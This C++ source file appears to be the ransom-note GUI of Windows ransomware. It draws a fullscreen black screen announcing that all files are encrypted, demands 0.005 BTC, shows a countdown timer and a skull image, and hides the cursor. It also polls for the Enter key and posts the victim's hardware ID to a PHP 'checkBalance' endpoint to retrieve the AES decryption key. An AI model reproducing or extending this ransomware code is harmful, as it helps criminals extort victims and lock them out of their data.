#include "MXGui.h"
#include "static.h"
#include "http.h"
#include <Windows.h>
#include <cstdlib>
MXGui::MXGui(const std::string& pubKey) {
    setWidthHeight();
    skull = new Fl_PNG_Image("Gürü", rawData, sizeof(rawData));
    window = new Fl_Window(width, height, "");
    label = new Fl_Box(0, height / 2.25, width, 30);
    message = new Fl_Box(0, height / 2, width, 30);
    this->pubKey = new Fl_Box(0, height / 1.85, width, 30);
    time = new Fl_Box(0, height / 1.60, width, 30);
    box = new Fl_Box((width - 256) / 2, height / 10, 256, 256);
    timeRemaining = new Fl_Box(0, height / 1.30, width, 30);

    label->label("ALL YOUR FILES HAVE BEEN ENCRYPTED !");
    label->align(FL_ALIGN_CENTER);
    label->color(FL_BLACK);
    label->labelcolor(FL_RED);
    label->labelfont(FL_BOLD);
    label->labelsize(36);

    message->label("Send 0.005 BTC to this address to get them back and then press enter : ");
    message->align(FL_ALIGN_CENTER);
    message->color(FL_BLACK);
    message->labelcolor(FL_WHITE);
    message->labelfont(FL_BOLD);
    message->labelsize(24);

    this->pubKey->label(pubKey.c_str());
    this->pubKey->align(FL_ALIGN_CENTER);
    this->pubKey->color(FL_BLACK);
    this->pubKey->labelcolor(FL_WHITE);
    this->pubKey->labelfont(FL_BOLD);
    this->pubKey->labelsize(24);

    time->label("Time remaining : ");
    time->align(FL_ALIGN_CENTER);
    time->color(FL_BLACK);
    time->labelcolor(FL_WHITE);
    time->labelfont(FL_BOLD);
    time->labelsize(28);

    timeRemaining->label("12:00:00");
    timeRemaining->align(FL_ALIGN_CENTER);
    timeRemaining->color(FL_BLACK);
    timeRemaining->labelcolor(FL_WHITE);
    timeRemaining->labelfont(FL_BOLD);
    timeRemaining->labelsize(72);

    box->image(skull);

    window->add(label);
    window->color(FL_BLACK);
    window->fullscreen();
}

void MXGui::show() {
    window->show();
    window->cursor(FL_CURSOR_NONE);
}

int MXGui::run() {
    return Fl::run();
}

void MXGui::updateRemainingTime(const std::string& remainingTime) {
    timeRemaining->label(("Time remaining: " + remainingTime).c_str());
    window->redraw();
}

MXGui::~MXGui() {
    delete window;
}

void MXGui::setWidthHeight() {
    height = GetSystemMetrics(SM_CYSCREEN);
    width = GetSystemMetrics(SM_CXSCREEN);	
}

void MXGui::isEnterPress() {
    Http http(L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
	extern std::string hwId;
    int i = 0;
    while (true) {
        if (GetAsyncKeyState(VK_RETURN) == 0x8000) {
            std::string aes = http.SendPostRequest(L"localhost", L"/server/hdhohzuag.php?action=checkBalance", L"Content-Type: application/x-www-form-urlencoded\r\n", "uuid=" + hwId);
            i++;
            MessageBoxA(NULL, aes.c_str(), "key", MB_OK);
        }

	}
}











